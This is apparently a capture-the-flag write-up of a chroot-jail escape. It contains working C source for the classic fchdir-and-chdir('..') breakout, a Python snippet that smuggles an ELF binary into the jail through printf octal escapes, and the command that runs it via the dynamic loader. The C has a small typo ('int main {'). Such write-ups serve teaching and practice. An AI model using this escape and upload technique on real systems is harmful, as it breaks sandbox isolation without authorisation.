# chroot-bronze (500 pts) — KIT CTF

> *"Why do you need Docker when you have chroot?"*

## Challenge

Connect via TLS to a chroot jail:

```
openssl s_client -connect <instance>.tcp.kit.sasc.tf:443 -servername <instance>.tcp.kit.sasc.tf -quiet
```

You get a root shell (`#`) in an extremely minimal chroot environment. The flag is on the **real** root filesystem, outside the chroot jail. Break out and read it.

## Recon

The jail contains only:

```
/ bin/ lib/ lib64/
/bin/sh
/lib/x86_64-linux-gnu/libc.so.6
/lib64/ld-linux-x86-64.so.2
```

No `ls`, `cat`, `id`, `mkdir`, `chroot`, `dd`, `wc`, `strings`, or any other utilities. Just `/bin/sh` and the two shared libraries.

Key observations:
- **/proc is mounted** but only globs like `/proc/*` work — actual PID directories return "No such file" when accessed
- `/proc/1/root` is **not accessible** (not a directory, not a symlink — nothing readable)
- You **can write files** to `/` (the chroot root)
- The shell can use `printf` with octal escapes (`\000`) to write arbitrary bytes including nulls
- The dynamic linker `/lib64/ld-linux-x86-64.so.2` can execute arbitrary ELF binaries loaded from within the jail

## Solution

### Strategy

Classic chroot escape:
1. `open("/", O_RDONLY)` — get a file descriptor to the chroot root while we're still inside the original namespace
2. `chroot("/subdir")` — pivot into a subdirectory
3. `fchdir(fd)` — change CWD back to the real root (outside the new chroot, since fd was opened before the chroot pivot)
4. `chdir("..")` × 1000 — walk up to the real root of the filesystem
5. `chroot(".")` — lock into the real root
6. `execve("/bin/sh", ...)` — spawn a shell in the real filesystem

### Binary Delivery

With no `curl`, `wget`, or `nc`, uploading the escape binary is the hardest part.

**Method:** `printf` with octal escape sequences concatenated via `>>`:

```python
# Encode each byte as \ooo (octal)
parts = [f"\\{b:03o}" for b in chunk]
escaped = "".join(parts)
# Send 128 bytes at a time to stay under command-line limits
cmd(f"printf '{escaped}' >> /jb")
```

The `printf` built-in handles null bytes (`\000`) correctly, preserving the full ELF binary. After uploading 14,464 bytes in ~113 chunks, run it:

```
/lib64/ld-linux-x86-64.so.2 /jb
```

### Escape Binary

```c
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

int main {
 mkdir("/x", 0755); // create subdirectory
 int fd = open("/", O_RDONLY); // save fd to chroot root
 chroot("/x"); // pivot chroot
 fchdir(fd); // cd to old root via saved fd
 close(fd);
 for (int i = 0; i < 1000; i++)
 chdir(".."); // walk up to real root
 chroot("."); // lock into real root
 execl("/bin/sh", "sh", "-c",
 "cat /flag* /flag.txt 2>/dev/null; exec /bin/sh", NULL);
 return 0;
}
```

Compiled as a dynamically-linked PIE ELF (`gcc -Os -s -o esc2 esc2.c`), 14,464 bytes — small enough for printf upload.

## Flag

```
kaspersky{df0581db-a60a-4b92-8e1c-194c7c91a290}
```

After escape, the real filesystem is visible:

```
/ bin/ dev/ etc/ app/ init/ lib/ lib64/
proc/ root/ sbin/ sys/ tmp/ usr/
```

Confirms we broke out of the minimal `/bin /lib /lib64` jail.

## Key Takeaways

- **`printf '%b'` with octal escapes** is the go-to binary upload method when no network tools exist but the shell has `printf` built-in
- **`/lib64/ld-linux-x86-64.so.2 <binary>`** executes any ELF without needing `+x` permissions (only `+r`)
- The classic **chroot escape sequence** works when you can open a fd before the chroot pivot and the kernel hasn't hardened against `fchdir` + `chdir("..")` chains
- Minimal chroot jails that leave `/proc` and the dynamic linker accessible are trivially escapable